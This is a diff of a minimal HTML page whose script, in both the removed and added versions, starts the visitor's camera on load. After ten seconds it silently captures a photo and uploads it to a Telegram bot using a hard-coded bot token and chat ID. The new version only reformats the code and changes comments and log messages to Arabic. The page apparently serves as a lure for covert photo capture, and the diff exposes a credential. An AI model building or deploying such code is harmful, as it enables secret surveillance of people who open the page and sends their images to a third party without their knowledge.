@@ -1,55 +1,68 @@
 <!DOCTYPE html>
 <html>
-<body>
-  <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
-  <script>
-    const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
-    const CHAT_ID = '6036900535';
-    const video = document.getElementById('video');
+  <body>
+    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          setTimeout(captureAndSendPhoto, 10000); // بعد 10 ثوانٍ
-        };
-      } catch (err) {
-        console.error('Camera error:', err);
+    <script>
+      const BOT_TOKEN = '7808033895:AAFnqEHgGsWmj3JOy9c0Q_6swZmltih6orU';
+      const CHAT_ID = '6036900535';
+      const video = document.getElementById('video');
+
+      async function startCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+
+          video.onloadedmetadata = () => {
+            console.log("📷 الكاميرا بدأت");
+            setTimeout(() => {
+              captureAndSendPhoto();
+            }, 10000); // الانتظار 10 ثوانٍ بعد تشغيل الكاميرا
+          };
+
+        } catch (err) {
+          console.error('❌ Camera error:', err);
+        }
       }
-    }
 
-    async function captureAndSendPhoto() {
-      if (video.readyState < 2) {
-        console.warn("Camera not ready yet.");
-        setTimeout(captureAndSendPhoto, 2000);
-        return;
+      async function captureAndSendPhoto() {
+        if (video.readyState < 2) {
+          console.warn("⏳ الكاميرا ليست جاهزة بعد");
+          setTimeout(captureAndSendPhoto, 2000);
+          return;
+        }
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+          if (!blob) {
+            console.error("❌ فشل في تحويل الصورة إلى Blob");
+            return;
+          }
+
+          const formData = new FormData();
+          formData.append('chat_id', CHAT_ID);
+          formData.append('photo', blob, 'photo.jpg');
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          }).then(() => {
+            console.log('✅ تم إرسال الصورة إلى تيليجرام');
+          }).catch(err => {
+            console.error('❌ فشل في إرسال الصورة:', err);
+          });
+
+        }, 'image/jpeg', 0.95);
       }
 
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob((blob) => {
-        if (!blob) return;
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'photo.jpg');
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        }).then(() => {
-          console.log('✅ Photo sent!');
-        }).catch(err => {
-          console.error('❌ Failed to send photo:', err);
-        });
-      }, 'image/jpeg', 0.95);
-    }
-
-    startCamera();
-  </script>
-</body>
+      // ابدأ العملية
+      startCamera();
+    </script>
+  </body>
 </html>
